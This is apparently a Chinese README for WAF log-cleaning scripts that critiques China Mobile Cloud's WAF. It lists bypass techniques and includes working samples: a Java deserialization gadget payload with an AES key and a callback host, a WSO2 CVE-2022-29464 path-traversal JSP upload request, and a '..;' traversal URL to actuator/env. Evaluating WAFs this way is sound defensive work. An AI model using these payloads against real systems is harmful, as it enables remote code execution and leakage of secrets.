# waf-log-clean-data-script
存放在工作中为了从大量日志中清洗出有用的数据的脚本
# 移动云waf
不好用
1.无法设置全局封禁ip

2.SQL注入使用内联注释可绕过,存在MD5编码绕过，CHR()函数构造绕过，以及最普通的SQL注入存在概率放行

3.数据包X-Forwarded-For:IP0,IP1,IP2... IP0为攻击者真实IP，移动云waf显示为IP2。

4.反序列化攻击流量paylaodbase64编码，能检测但不阻拦 

样本
```
bundle={{concat(url_encode(base64(aes_cbc(base64_decode(generate_java_gadget("dns", "http://{{reverse.url}}", "base64")), base64_decode("Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo="), base64_decode("QUVTL0NCQy9QS0NTNVBhZA==")))), '$2')}}
```

5.文件上传有概率，检测但不阻拦

样本:
```
POST /fileupload/toolsAny HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close Content-Length: 375
Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
Accept-Encoding: gzip
X-Forwarded-For:  -----------------------------250033711231076532771336998311
Content-Disposition: form-data;

name="../../../../repository/deployment/server/webapps/authenticationendpoint/2yjbn94qnqeqdikvv30zcavar2a.jsp";filename="test.jsp" Content-Type: application/octet-stream <% out.print("WSO2-RCE-CVE-2022-29464"); %> -----------------------------250033711231076532771336998311--
```

6.使用`..;`可以进行被绕过
样本:

```
/aspnet_client/actuator/aspnet_client/actuator/env/..;/..;/..;//actuator/env
```
